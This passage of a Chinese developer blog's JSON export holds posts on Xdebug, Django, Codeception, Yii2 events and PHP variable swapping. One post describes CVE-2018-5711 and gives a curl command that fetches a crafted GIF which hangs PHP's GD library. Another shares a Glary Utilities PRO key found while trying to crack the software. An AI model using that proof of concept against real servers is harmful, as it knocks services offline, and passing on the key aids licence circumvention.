#获取file.jar文件的时间戳","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"git","slug":"git","permalink":"https://war9.cn/tags/git/"},{"name":"仓库同步","slug":"仓库同步","permalink":"https://war9.cn/tags/%E4%BB%93%E5%BA%93%E5%90%8C%E6%AD%A5/"},{"name":"git-mirror","slug":"git-mirror","permalink":"https://war9.cn/tags/git-mirror/"},{"name":"sync","slug":"sync","permalink":"https://war9.cn/tags/sync/"}],"author":"Joe shengxin"},{"title":"PHP-Xdebug","slug":"PHP-Xdebug","date":"2018-03-02T10:54:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/03/02/PHP-Xdebug/","link":"","permalink":"https://war9.cn/2018/03/02/PHP-Xdebug/","excerpt":"","text":"PHP使用Xdebug调试PHP项目前言网上类似的教程比较多，这里仅仅作为几个记录，用于备忘。 在项目过程中，使用某开源插件，结果在更新后，插件会报一些错误，传统的var_dump方式比较繁琐，这个时候正好使用Xdebug来进行调试。 Xdebug下载：https://xdebug.org/download.php 环境： | |–:|:–PHP版本|PHP 7.1.14 x64 VC14 ntsXdebug|Xdebug-2.6.0-7.1-vc14-nts-x86_64IDE|PHPStorm 2017.2.1 环境安装 Xdebug安装 通过phpinfo();检查是否安装扩展。 如果没有安装，到https://xdebug.org/download.php Xdebug下载页面下载dll 我下载的PHP7.1版本php_xdebug-2.6.0-7.1-vc14-nts-x86_64.dll 如果不知道如何选择，可以到官方提供的帮助页面https://xdebug.org/wizard.php 在此使用php -i 输出phpinfo信息，然后将信息粘贴到该页面，提交后会告诉你下载链接。 得到结果如图 修改PHP.ini 加入以下代码，开启Xdebug扩展。 1zend_extension &#x3D; php_xdebug-2.6.0-7.1-vc14-nts-x86_64.dll 重启PHP后，使用php -v 查看是否安装成功。 PHPStorm 配置 配置PHPstorm之前，要配置xdebug允许phpstorm进行调试。修改php.ini加入以下代码 PHPstorm默认使用的9000端口，但本地有程序占用，于是进行了修改。这里一定要和PHPstorm的端口一致 123456[xdebug] xdebug.remote_enable &#x3D; On xdebug.remote_handler &#x3D; dbgp xdebug.remote_host&#x3D; localhost xdebug.remote_port &#x3D; 8091 xdebug.idekey &#x3D; PHPSTORM 重启PHP 接下来修改PHPstorm配置 修改 文件-&gt;设置-&gt;语言和框架-&gt;PHP-&gt;Debug 修改 文件-&gt;设置-&gt;语言和框架-&gt;PHP-&gt;Debug-&gt;DBGp Proxy Host 如果自定义了域名一定要写你自定义的域名 ** 添加一个Server** 文件-&gt;设置-&gt;语言和框架-&gt;PHP-&gt;Servers Host 如果自定义了域名一定要写你自定义的域名 修改 运行调试配置 添加一个PHP Web Application. 下断调试 在行号后点击，出现红点，说明下了断点。 开启监听，如上图所示，有一个电话的图标，将其置为绿色启用监听。 点击臭虫按钮，弹出网站页面，就可以看到监听信息了，可以看到许多变量信息。 我这里是遇到yii-audit插件总是无法插入request数据到数据库，进行一次调试。 https://github.com/bedezign/yii2-audit/issues/238","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"Xdebug","slug":"Xdebug","permalink":"https://war9.cn/tags/Xdebug/"},{"name":"PHP调试","slug":"PHP调试","permalink":"https://war9.cn/tags/PHP%E8%B0%83%E8%AF%95/"},{"name":"phpStorm+Xdebug","slug":"phpStorm-Xdebug","permalink":"https://war9.cn/tags/phpStorm-Xdebug/"}],"author":"Joe shengxin"},{"title":"Django安装部署","slug":"Django-MariaDB-Install","date":"2018-02-12T10:02:00.000Z","updated":"2021-02-18T13:06:57.081Z","comments":true,"path":"2018/02/12/Django-MariaDB-Install/","link":"","permalink":"https://war9.cn/2018/02/12/Django-MariaDB-Install/","excerpt":"","text":"前言近期在做个一个分布式爬虫项目，欲使用Django做爬虫的控制和数据展示。 因此本文将记录在安装编写Django应用时遇到的坑。 本文环境为Python2.7+Django1.11.10+Mariadb10.2.7 安装 查看是否安装Django 1python -c &quot;import django; print(django.get_version())&quot; 如果有版本号输出，说明已经安装过了，安装步骤就可以跳过。 如果没有则 pip 进行安装 安装 1pip install django 再次使用django.get_version()查看版本信息 123user@Joe MINGW64 /d/PythonWorkSpace/wikiCrawler$ python -c &quot;import django; print(django.get_version())&quot;1.11.10 安装成功 新建数据库 本文默认在安装好Mariadb10.2.7的情况下。首先新建一个数据库。 1create database crawler 创建Django项目 切换至你想要存放代码的目录，执行如下命令创建Django项目 crawler可以改成你的项目名称 1django-admin startproject crawler 创建完毕后可以看到如下目录文件结构 1234567mysite&#x2F; manage.py crawler&#x2F; __init__.py settings.py urls.py wsgi.py 修改yourProject/setting.py配置 配置中国时区和语言12LANGUAGE_CODE &#x3D; &#39;zh-hans&#39;TIME_ZONE &#x3D; &#39;Asia&#x2F;Shanghai&#39; 配置数据库12345678910DATABASES &#x3D; &#123; &#39;default&#39;: &#123; &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;, &#39;NAME&#39;: &#39;DB_NAME&#39;, &#39;USER&#39;: &#39;DB_USER&#39;, &#39;PASSWORD&#39;: &#39;DB_PASS&#39;, &#39;HOST&#39;: &#39;127.0.0.1&#39;, &#39;PORT&#39;: &#39;3306&#39;, &#125;&#125; 安装Mysql-python驱动 在使用pip-install mysql-python的时候，发现这个驱动依赖于VC++9.0安装报错 12building &#x27;_mysql&#x27; extensionerror: Microsoft Visual C++ 9.0 is required. Get it from http://aka.ms/vcpython27 到 http://aka.ms/vcpython27 下载相应库。发现还是编译错误。。 最后还是到官网下载 安装包进行下载。https://pypi.python.org/pypi/MySQL-python/此时报错消失，成功解决了。 migrate 导入数据库 切换到manage.py所在目录 执行如下命令。 1python manage.py migrate 提示如下： 12345678910111213141516 Operations to perform: Apply all migrations: admin, auth, contenttypes, sessionsRunning migrations: Applying contenttypes.0001_initial... OK Applying auth.0001_initial... OK Applying admin.0001_initial... OK Applying admin.0002_logentry_remove_auto_add... OK Applying contenttypes.0002_remove_content_type_name... OK Applying auth.0002_alter_permission_name_max_length... OK Applying auth.0003_alter_user_email_max_length... OK Applying auth.0004_alter_user_username_opts... OK Applying auth.0005_alter_user_last_login_null... OK Applying auth.0006_require_contenttypes_0002... OK Applying auth.0007_alter_validators_add_error_messages... OK Applying auth.0008_alter_user_username_max_length... OK Applying sessions.0001_initial... OK 自此Django+MariaDB连接成功。 文档资料参考 http://python.usyiyi.cn/documents/django_182/index.htmlhttps://docs.djangoproject.com/en/2.0/","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Django","slug":"develop/Django","permalink":"https://war9.cn/categories/develop/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://war9.cn/tags/Django/"},{"name":"Python","slug":"Python","permalink":"https://war9.cn/tags/Python/"},{"name":"MariaDB","slug":"MariaDB","permalink":"https://war9.cn/tags/MariaDB/"}],"author":"Joe shengxin"},{"title":"Glary Utilities PRO注册码","slug":"GlaryUtilitiesKey","date":"2018-02-11T17:47:00.000Z","updated":"2021-02-18T13:06:57.081Z","comments":true,"path":"2018/02/11/GlaryUtilitiesKey/","link":"","permalink":"https://war9.cn/2018/02/11/GlaryUtilitiesKey/","excerpt":"","text":"Glary Utilities 是一个一站式电脑优化解决方案软件。 功能列表： √ 清理系统垃圾文件(临时文件、无用注册表、上网记录) √ 管理和删除IE插件 √ 分析磁盘空间使用情况，查找重复文件 √ 优化内存 √ 管理自启动程序 √ 卸载软件 本软件本来是免费版本，是一个替代360的不错选择，不会对系统做出太多的修改。但是近期推出了PRO 专业版。于是进行了爆破，在一顿分析后..本以为破解成功..结果随便输入的 AAAA-AAAA-AAAA-AAAA 是他隐藏的内置Key…大家拿去用把。233 注册码： AAAA-AAAA-AAAA-AAAA","categories":[{"name":"工具资源","slug":"resources","permalink":"https://war9.cn/categories/resources/"}],"tags":[{"name":"GlaryUtilitiesPro","slug":"GlaryUtilitiesPro","permalink":"https://war9.cn/tags/GlaryUtilitiesPro/"},{"name":"注册码","slug":"注册码","permalink":"https://war9.cn/tags/%E6%B3%A8%E5%86%8C%E7%A0%81/"}],"author":"Joe shengxin"},{"title":"PHP-GD库漏洞可导致服务器宕机","slug":"GD库漏洞可导致服务器宕机","date":"2018-02-02T11:04:00.000Z","updated":"2021-02-18T13:06:57.081Z","comments":true,"path":"2018/02/02/GD库漏洞可导致服务器宕机/","link":"","permalink":"https://war9.cn/2018/02/02/GD%E5%BA%93%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%95%E6%9C%BA/","excerpt":"","text":"简介通过精心构造的恶意图片，可以在GD库使用imagecreatefromgif函数载入图像时，导致cpu耗尽，实现拒绝服务攻击。因此如果项目中使用GD库处理图片，要特别注意。 CVE编号：CVE-2018-5711 漏洞影响版本 PHP 5 &lt; 5.6.33 PHP 7.0 &lt; 7.0.27 PHP 7.1 &lt; 7.1.13 PHP 7.2 &lt; 7.2.1 漏洞细节漏洞存在于文件ext/gd/libgd/gd_gif_in.c中，其中在LWZReadByte_函数中存在一个循环（while-loop）： 1234do &#123; sd-&gt;firstcode = sd-&gt;oldcode = GetCode(fd, &amp;sd-&gt;scd, sd-&gt;code_size, FALSE, ZeroDataBlockP);&#125; while (sd-&gt;firstcode == sd-&gt;clear_code); 其调用的GetCode 1234567891011static intGetCode_(gdIOCtx *fd, CODE_STATIC_DATA *scd, int code_size, int flag, int *ZeroDataBlockP)&#123; int i, j, ret; unsigned char count; ... if ((count = GetDataBlock(fd, &amp;scd-&gt;buf[2], ZeroDataBlockP)) &lt;= 0) scd-&gt;done = TRUE; ...&#125; GetCode_ 会调用GetDataBlock来读取GIF图片中的数据： 12345678910111213141516static intGetDataBlock_(gdIOCtx *fd, unsigned char *buf, int *ZeroDataBlockP)&#123; unsigned char count; if (! ReadOK(fd,&amp;count,1)) &#123; return -1; &#125; *ZeroDataBlockP = count == 0; if ((count != 0) &amp;&amp; (! ReadOK(fd, buf, count))) &#123; return -1; &#125; return count;&#125; 该漏洞依赖于从整形（int）到无符号字符（unsigned char）的类型转换。如果GetDataBlock_返回-1，则第400行中的scd-&gt;done将会被设置为True，并停止while循环。但是其定义的count是无符号字符，它总是从0到255的正数，所以这种循环停止动作是不会被触发执行的。 因此，最终结果就是，一张GIF图片就可以实现无限循环，导致服务器资源耗尽，直到崩溃宕机。 漏洞验证刚好本机开发使用的PHP版本是7.1.8，属于漏洞影响范围。 将构造好的Poc下载到本地。 1curl -L https://git.io/vN0n4 | xxd -r &gt; poc.gif 新建一个PHP文件，使用imagecreatefromgif函数载入Poc 12&lt;?phpimagecreatefromgif(&quot;poc.gif&quot;); 因为本机的环境限制了PHP CPU的使用，可以避免物理机死机。不过仍可以看到这时CPU占用达到了35%左右。这时PHP服务已经宕掉了。访问其它项目，发现也无法访问报504错误。 漏洞修复更新PHP版本Url:http://php.net/downloads.php更新后，继续测试Poc，会提示 1imagecreatefromgif(): &#39;poc.gif&#39; is not a valid GIF file in 注：PHP7.2禁用了Object作为类名。一些框架（比如Yii2）或者之前的项目设计很多使用了Object。因此升级到7.2版本需要注意。为了兼容我本机暂时只升级到7.1的最新版本。 2018年2月2日 - PHP 7.1.14.如果升级PHP7.2，更多变更查看https://wiki.php.net/rfc/deprecations_php_7_2 文中部分引用以下链接内容。内容有删改。https://bugs.php.net/bug.php?id=75571http://php.net/ChangeLog-7.phphttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5711http://www.freebuf.com/vuls/161262.html","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://war9.cn/tags/PHP/"},{"name":"PHP漏洞","slug":"PHP漏洞","permalink":"https://war9.cn/tags/PHP%E6%BC%8F%E6%B4%9E/"},{"name":"GD库漏洞","slug":"GD库漏洞","permalink":"https://war9.cn/tags/GD%E5%BA%93%E6%BC%8F%E6%B4%9E/"}],"author":"Joe shengxin"},{"title":"Codeception(三)","slug":"Codeception-three","date":"2018-01-29T11:38:00.000Z","updated":"2021-02-18T13:06:57.081Z","comments":true,"path":"2018/01/29/Codeception-three/","link":"","permalink":"https://war9.cn/2018/01/29/Codeception-three/","excerpt":"","text":"前言前两篇文章介绍了安装和单元测试。 这篇文章我们来介绍Fixture概念和功能测试、验收测试。 功能测试和验收测试在Codeception中，部分代码和测试流程很相似，所以我们也来说一下功能测试和验收测试的区别。 Fixture概念Fixtures 是测试中非常重要的一部分。他们的主要目的是建立一个固定/已知的环境状态以确保测试可重复并且按照预期方式运行。Yii 提供一个简单可用的 Fixure 框架 允许你精确的定义你的 Fixtures 。 Yii 的 Fixture 框架的核心概念称之为 fixture object 。一个 Fixture object代表一个测试环境的某个特定方面，它是 yii\\test\\Fixture 或者其子类的实例。 比如，你可以使用 UserFixture 来确保用户DB表包含固定的数据。 你在运行一个测试之前加载一个或者多个 fixture object，并在结束后卸载他们。 如果使用该功能，记的创建自己的测试DB，并且在test-local里配置DB。该功能在卸载时，会**清空数据库**。 >官方文档:http://www.yiiframework.com/doc-2.0/guide-test-fixtures.html 功能测试和验收测试的区别 功能测试 Functional Testing 功能测试主要用于测试我们是否创建了正确的产品，逐项测试各个功能。 对于这种类型的测试，要涵盖所有可能情景的测试用例，即使这种情况在“现实环境”中不太可能存在。当进行这种类型的测试时，我们的目标是最大的代码覆盖率。 验收测试 Acceptance Testing 验收测试是部署软件之前的最后一个测试操作。验收测试的目的是确保软件准备就绪，并且可以让最终用户将其用于执行软件的既定功能和任务。 这部分测试通常是与客户或内部测试人员合作完成的。对于这种类型的测试，我们使用的测试用例涵盖了我们期望软件使用的典型场景。 该测试主要测试以下几个点 - 可靠性，可用性：压力测试 - 扩展性：负载测试进行验证。 - 可用性：界面是否符合用户习惯等 - 安全性：代码审计、入侵测试 - 可维护性：通过演示如何提供软件更新/补丁来验证。 - 可配置性：通过证明客户如何修改系统配置来满足他们的需求来进行验证。 功能测试 使用模版创建功能测试同样的，我们使用模板来创建一个功能测试。 1codecept g:cest functional StudentCest 创建好的文件会在tests/functional下.内容如下： 1234567891011121314151617181920&lt;?phpnamespace backend\\tests;use backend\\tests\\FunctionalTester;class StudentCest&#123; public function _before(FunctionalTester $I) &#123; &#125; public function _after(FunctionalTester $I) &#123; &#125; // tests public function tryToTest(FunctionalTester $I) &#123; &#125;&#125; 可以看到内容和之前创建的Test模板很像。 不同的是，这里的方法多了一个参数functionalTester。 其实这个参数就是我们在Codeception（二）里面所说的actor概念。传送门：点我跳转 配置比如我们这里对登录功能做测试。需要使用到数据库，所以我们首先应配置数据库。 修改config/test-local.php,如果我们项目中使用了多个数据库，也要配置多个db。 1234567891011121314151617181920212223 &lt;?php return yii\\helpers\\ArrayHelper::merge( require __DIR__ . &#x27;/../../common/config/test-local.php&#x27;, require __DIR__ . &#x27;/main.php&#x27;, require __DIR__ . &#x27;/main-local.php&#x27;, require __DIR__ . &#x27;/test.php&#x27;, [ &#x27;components&#x27; =&gt; [ &#x27;db&#x27; =&gt; [ &#x27;dsn&#x27; =&gt; &#x27;mysql:host=localhost;dbname=yii2-test&#x27;, &#x27;username&#x27; =&gt; &#x27;&#x27;, &#x27;password&#x27; =&gt; &#x27;&#x27;, ], &#x27;db2&#x27; =&gt; [ &#x27;class&#x27; =&gt; &#x27;yii\\db\\Connection&#x27;, &#x27;dsn&#x27; =&gt; &#x27;mysql:host=localhost;dbname=yii2-test2&#x27;, &#x27;username&#x27; =&gt; &#x27;&#x27;, &#x27;password&#x27; =&gt; &#x27;&#x27;, &#x27;charset&#x27; =&gt; &#x27;utf8&#x27;, ], ], ]); 定义Fixture定义Fixture，用于指定账号密码登录修改刚才模板生成的文件，加入以下方法： 123456789public function _fixtures()&#123; return [ &#x27;user&#x27; =&gt; [ &#x27;class&#x27; =&gt; UserFixture::className(), &#x27;dataFile&#x27; =&gt; codecept_data_dir() . &#x27;login_data.php&#x27;, ] ];&#125; 注：该方法会在Yii2::_before()里自动调用 然后我们需要在tests/_data文件夹下写入登录数据 /tests/_data/login_data.php 1234567891011121314&lt;?php return [ [ &#x27;username&#x27; =&gt; &#x27;erau&#x27;, &#x27;auth_key&#x27; =&gt; &#x27;tUu1qHcde0diwUol3xeI-18MuHkkprQI&#x27;, // password_0 &#x27;password_hash&#x27; =&gt; &#x27;$2y$13$nJ1WDlBaGcbCdbNC5.5l4.sgy.OMEKCqtDQOdQ2OWpgiKRWYyzzne&#x27;, &#x27;password_reset_token&#x27; =&gt; &#x27;RkD_Jw0_8HEedzLk7MM-ZKEFfYR7VbMr_1392559490&#x27;, &#x27;created_at&#x27; =&gt; &#x27;1392559490&#x27;, &#x27;updated_at&#x27; =&gt; &#x27;1392559490&#x27;, &#x27;email&#x27; =&gt; &#x27;sfriesen@jenkins.info&#x27;, ],]; 编写测试方法123456789 public function loginUser(FunctionalTester $I)&#123; $I-&gt;amOnRoute(&#x27;site/login&#x27;); $I-&gt;fillField(&#x27;LoginForm[username]&#x27;, &#x27;erau&#x27;); $I-&gt;fillField(&#x27;LoginForm[password]&#x27;, &#x27;password_0&#x27;); $I-&gt;click(&#x27;login-button&#x27;); $I-&gt;see(&#x27;退出 (erau)&#x27;); $I-&gt;dontSeeLink(&#x27;登录&#x27;);&#125; 运行功能测试1codecept run 一些其它说明 _before的使用 比如我们在做登录功能测试时，不仅要测试正确的账号密码是否可以登录，还要考虑用户名密码为空时，是否会显示用户名密码不能为空这样的提示。也要测试错误的密码是否会提示密码错误。这就需要我们每次测试之前跳转到登录页面。 因此可以写如下代码，每次测试时，恢复路由。 1234public function _before(FunctionalTester $I)&#123; $I-&gt;amOnRoute(&#x27;site/login&#x27;);&#125; 验收测试验收测试编写流程和功能测试大体相同，不再赘述。","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"单元测试","slug":"单元测试","permalink":"https://war9.cn/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"name":"codeception","slug":"codeception","permalink":"https://war9.cn/tags/codeception/"},{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"}],"author":"Joe shengxin"},{"title":"Yii2 Event事件-场景应用","slug":"Yii2-Event事件-场景应用","date":"2018-01-24T17:25:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/24/Yii2-Event事件-场景应用/","link":"","permalink":"https://war9.cn/2018/01/24/Yii2-Event%E4%BA%8B%E4%BB%B6-%E5%9C%BA%E6%99%AF%E5%BA%94%E7%94%A8/","excerpt":"","text":"yii2-事件 系列 第二篇 前言通过Yii2的事件功能，为我们的项目开发带来了极大的便捷性。本文在介绍几个比较特别的事件同时，将通过介绍几个应用场景的方式，来更贴切实际开发。 更多事件请查看Yii2速查表或我的上篇文章Yii2 Event事件-初识 EVENT_AFTER_FIND在查询结束后，会触发EVENT_AFTER_FIND事件。注意Yii2里没有EVENT_BEFORE_FIND事件(查询前)。 而EVENT_AFTER_FIND和其它事件不同的是 虽然该常量定义是BaseActiveRecord::EVENT_AFTER_FIND， 但是该事件触发位置由yii\\db\\ActiveQuery触发。具体位置 1yii\\db\\ActiveQuery::populate() 使用场景 文章发布日期显示2分钟前这样的格式。 1.绑定事件 12345678910\\yii\\base\\Event::on( BaseActiveRecord::className(), BaseActiveRecord::EVENT_AFTER_FIND, function ($event)&#123; $model &#x3D; $event-&gt;sender; $model-&gt;update_date &#x3D; time_tran($model-&gt;update_date); $event-&gt;sender &#x3D; $model; return $event; &#125;); 2.新建时间转换函数 1234567891011121314151617181920212223242526function time_tran($agoTime)&#123; $agoTime &#x3D; strtotime($agoTime); $time &#x3D; time() - $agoTime; if ($time &gt;&#x3D; 31104000) &#123; &#x2F;&#x2F; N年前 $num &#x3D; (int)($time &#x2F; 31104000); return $num.&#39;年前&#39;; &#125; if ($time &gt;&#x3D; 2592000) &#123; &#x2F;&#x2F; N月前 $num &#x3D; (int)($time &#x2F; 2592000); return $num.&#39;月前&#39;; &#125; if ($time &gt;&#x3D; 86400) &#123; &#x2F;&#x2F; N天前 $num &#x3D; (int)($time &#x2F; 86400); return $num.&#39;天前&#39;; &#125; if ($time &gt;&#x3D; 3600) &#123; &#x2F;&#x2F; N小时前 $num &#x3D; (int)($time &#x2F; 3600); return $num.&#39;小时前&#39;; &#125; if ($time &gt; 60) &#123; &#x2F;&#x2F; N分钟前 $num &#x3D; (int)($time &#x2F; 60); return $num.&#39;分钟前&#39;; &#125; return &#39;1分钟前&#39;;&#125; EVENT_BEFORE_VALIDATE该事件顾名思义，就是在model验证前事件。 该事件有一个很棒的特性，在触发该事件，当你的handler函数执行了一系列操作，这个时候如果你发现没有验证的必要的时候。可以手动修改$event-&gt;isVaild = false。 后续就不会再继续验证了。可以减少一些代码执行，提高效率。 自定义事件有许多场景可以使用到事件，比如我们在用户注册后，发送验证邮件。下面是事例代码： 12345678910111213141516171819202122232425262728293031323334&lt;?phpnamespace console\\controllers;use Yii;use yii\\console\\Controller;use yii\\base\\Component;class RegesiterController extends Controller&#123; public function actionTest() &#123; $core = new Core(); $user = new user(); $user-&gt;on(&#x27;regesiter&#x27;, [$core, &#x27;verifyMail&#x27;]); $student-&gt;regesiter(); &#125;&#125;class User extends Component&#123; public function regesiter() &#123; echo &quot;User regesited\\n&quot;; $this-&gt;trigger(&#x27;regesiter&#x27;); &#125;&#125;class Core extends Component&#123; public function verifyMail() &#123; echo &quot;Core Send E-mail to User\\n&quot;; &#125;&#125;","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"},{"name":"yii2-event","slug":"yii2-event","permalink":"https://war9.cn/tags/yii2-event/"},{"name":"yii2-事件","slug":"yii2-事件","permalink":"https://war9.cn/tags/yii2-%E4%BA%8B%E4%BB%B6/"}],"author":"Joe shengxin"},{"title":"【算法】变量交换","slug":"algorithmExchange-variables","date":"2018-01-24T11:25:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/24/algorithmExchange-variables/","link":"","permalink":"https://war9.cn/2018/01/24/algorithmExchange-variables/","excerpt":"","text":"我们常见的两变量交换会采用第三个变量。本文记录几个不使用临时变量交换方法。 list 简洁 不改变变量类型适用所有变量类型 123456&lt;?php $a = &quot;你好&quot;; $b = &quot;世界&quot;; echo $a.$b;//输出 “你好世界” list($b,$a) = [$a,$b]; echo $a.$b;//输出 “世界你好” ^异或 适用于等长文本和int类型 12345678910&lt;?php $a = 98; $b = 12; var_dump($a);//int(98) var_dump($b);//int(12) $a = $a^$b; $b = $b^$a; $a = $a^$b; var_dump($a);//int(12) var_dump($b);//int(98) 经过测试list方法和异或方法执行时间毫秒级暂时看不出区别。 但是内存方面list方法会比异或方法占用要多一点。事实上，List的方法虽然简洁，但是内存开销比新建一个中间变量还要大。。 测试代码 12345678910111213141516171819&lt;?php $a = 9899999; $b = 4546464; var_dump($a); var_dump($b); $t1 = microtime(true); $a = $a^$b; $b = $b^$a; $a = $a^$b; $t2 = microtime(true); echo &#x27;耗时&#x27;.($t2-$t1).&#x27;微秒&lt;br&gt;&#x27;; echo &#x27;Now memory_get_usage: &#x27; . memory_get_usage() . &#x27;&lt;br /&gt;&#x27;; var_dump($a); var_dump($b); /* int(9899999) int(4546464) 耗时1.9073486328125E-6微秒 Now memory_get_usage: 352232 int(4546464) int(9899999) */ 12345678910111213141516$a = 9899999;$b = 4546464;var_dump($a);var_dump($b);$t1 = microtime(true);list($b,$a) = [$a,$b];$t2 = microtime(true);echo &#x27;耗时&#x27;.($t2-$t1).&#x27;微秒&lt;br&gt;&#x27;;echo &#x27;Now memory_get_usage: &#x27; . memory_get_usage() . &#x27;&lt;br /&gt;&#x27;;var_dump($a);var_dump($b);/*int(9899999) int(4546464) 耗时1.9073486328125E-6微秒Now memory_get_usage: 352312int(4546464) int(9899999)*/","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://war9.cn/tags/PHP/"},{"name":"算法","slug":"算法","permalink":"https://war9.cn/tags/%E7%AE%97%E6%B3%95/"}],"author":"Joe shengxin"},{"title":"Codeception（二）","slug":"Codeception-second","date":"2018-01-23T11:22:00.000Z","updated":"2021-02-18T13:06:57.081Z","comments":true,"path":"2018/01/23/Codeception-second/","link":"","permalink":"https://war9.cn/2018/01/23/Codeception-second/","excerpt":"","text":"前言上文介绍了如何安装部署Codeception，并进行了简单的单元测试。本文将从Codeception的目录结构讲起，了解目录结构，和配置文件。并具体讲解单元测试的相关内容。功能测试和验收测试将在后面的文章来写。 一些预备知识点击名称以访问断言概念断言概念及使用 Actors概念Actiors是Codeception的一个重要概念，用来表示测试一个人行为。我们有一个UnitTester来执行单元测试代码；我们还有一个FunctionalTester，负责功能测试，采用内部的知识来把应用程序当作一个整体来测试；还有一个AcceptanceTester，以用户方式通过我们提供的界面检查应用程序的工作。 Actor类不需要写，而是通过套件生成。 Actor类的方法都是通过Codeception模块生成的，每个模块为不同的测试目的提供预定义的动作，并且它们可以被组合以适应测试环境，Codeception尝试通过这些模块解决可能存在的90%的问题，所以你不必另起炉灶。我们认为你可以花更多的时间写测试和支撑代码以使得这些测试得以运行。默认情况下AcceptanceTester依赖于PhpBrowser模块，它们在tests/acceptance.suite.yml配置文件中**[1]**： 123456class_name: AcceptanceTestermodules: enabled: - PhpBrowser: url: http:&#x2F;&#x2F;localhost&#x2F;myapp&#x2F; - HelperAcceptance 目录结构这里我们来了解一下codeception的目录结构。用于正确的使用Codeception 以上截图来自common目录。下面来贴一份干净的目录结构 123456789101112131415161718192021222324common -&gt;tests --&gt;_data//存放测试数据 --&gt;_output//测试输出目录 --&gt;_support ---&gt;_generated//Build Task 自动生成 ----&gt;AcceptanceTesterActions.php ----&gt;FunctionalTesterActions.php ----&gt;UnitTesterActions.php ---&gt;Helper//定义用户行为 ----&gt;Acceptance.php ----&gt;Functional.php ----&gt;Unit.php --&gt;acceptance//验收测试存放目录 ---&gt;_bootstrap.php --&gt;functional//功能测试 ---&gt;_bootstrap.php --&gt;unit//单元测试 ---&gt;_bootstrap.php --&gt;_bootstrap.php --&gt;acceptance.suite.yml//验收测试配置 --&gt;functional.suite.yml//功能测试配置 --&gt;unit.suite.yml//单元测试配置 -&gt;codeception.yml data文件夹存放我们预先定义好的数据，在测试的时候可以使用这些数据。当然像我们上篇文章一样直接写到单元测试方法里是也可以的。放到该目录更符合规范，目录清晰. Helper文件夹存放我们测试时候需要用到的帮助类。 一般情况下，我们自己编写的单元测试文件将按照不同的测试存放到acceptance、functional、unit里面。 每个目录都有一个_bootstrap文件，在执行测试的时候会预先执行该文件内容。 对于Yii来说，_bootstrap文件用于载入yii框架及其配置。这样就不会出现找不到框架某类的情况了。方便我们调试基于框架的代码。 单元测试Codeception使用phpUnit作为运行其测试的后端。因此，任何phpUnit测试都可以添加到代码测试套件中，然后执行。如果你曾经写过phpUnit测试，那么就像以前一样编写即可。上文中我们通过 1codecept g:test unit \\libraries\\\\DataHelper 创建了单元测试模板，模板的结果如下： 1234567891011121314151617181920212223&lt;?phpclass DataHelper extends \\Codeception\\Test\\Unit&#123; &#x2F;** * @var \\UnitTester *&#x2F; protected $tester; protected function _before() &#123; &#125; protected function _after() &#123; &#125; &#x2F;&#x2F; tests public function testMe() &#123; &#125;&#125; before和after方法用于在每次测试中创建一个测试对象，然后再销毁。分别对应PHPUnit里的setUp和tearDown。 而以test开头的方法是单元测试方法。 测试方法在测试中，我们可以使用断言进行单元测试。 比如$this-&gt;assertTrue(Condition); 而Codeception也使用expect封装了很多断言测试。 12345//except(&#x27;错误时提示信息&#x27;,condition条件)-&gt;期望结果方法expect(&#x27;函数存在遗漏:&#x27;, $result == $k)-&gt;true();//判断$result变量值和$k值是否相等。expect(&#x27;ID is wrong&#x27;, $user -&gt;ID)-&gt;contains(&#x27;123&#x27;);//判断$user-&gt;ID是否包含123 except提供的期望值判断方法全部方法存在于文件 1\\vendor\\codeception\\verify\\src\\Codeception\\Verify.php 下面列举出部分方法 equals 相等 contains 包含 greaterThan 大于 lessThan 小于 greaterOrEquals 大于等于 true 真 notNull 不为null isEmpty 是否是空 unit.suite.yml配置文件//TODO 1234modules: enabled: - Yii2: part: [email] 此模块启动yii应用程序的测试用例，并提供其他辅助方法来简化测试。它只有mail，以便排除功能测试中的其它方法。 通过访问测试用例中的$ this-&gt; tester类，可以使用yii2模块的方法 文章部分内容摘自以下链接，内容有删改：https://www.cloudxns.net/Support/detail/id/939.htmlhttp://www.kkh86.com/it/codeception/guide-create-project.htmlhttp://codeception.com/for/yii","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"单元测试","slug":"单元测试","permalink":"https://war9.cn/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"name":"codeception","slug":"codeception","permalink":"https://war9.cn/tags/codeception/"},{"name":"PHPUnit","slug":"PHPUnit","permalink":"https://war9.cn/tags/PHPUnit/"},{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"}],"author":"Joe 